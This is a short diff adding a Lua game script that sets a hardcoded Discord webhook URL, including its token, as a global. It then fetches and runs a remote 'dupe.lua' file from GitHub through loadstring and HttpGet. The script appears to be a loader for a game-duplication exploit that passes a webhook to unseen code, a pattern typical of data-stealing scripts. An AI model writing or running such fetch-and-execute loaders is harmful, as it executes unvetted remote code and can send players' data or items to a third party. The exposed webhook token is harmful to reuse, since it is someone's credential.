@@ -1,0 +1,9 @@
+Webhook = "https://discord.com/api/webhooks/1435377556390936747/iN6Gt23BRHfu1ymivadVCJ--nlrjImPizYl1pMDz3-6zjFzABWAcv3S2YwwbDhTCrzzk"
+
+if not Webhook:match("discord.com/api/webhooks") then
+end
+
+
+getgenv().UserWebhookURL = Webhook
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/refs/heads/main/dupe.lua'))()
